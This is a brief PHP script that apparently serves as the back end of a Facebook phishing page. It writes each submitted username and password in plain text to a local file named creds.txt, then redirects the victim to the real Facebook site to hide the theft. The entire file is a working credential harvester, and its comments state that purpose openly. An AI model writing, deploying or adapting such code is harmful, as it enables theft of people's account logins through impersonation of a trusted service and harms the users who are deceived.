<?php
// Save credentials in a text file
file_put_contents("creds.txt",
  "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n",
  FILE_APPEND
);

// Redirect to real Facebook
header("Location: https://facebook.com");
exit();
?>
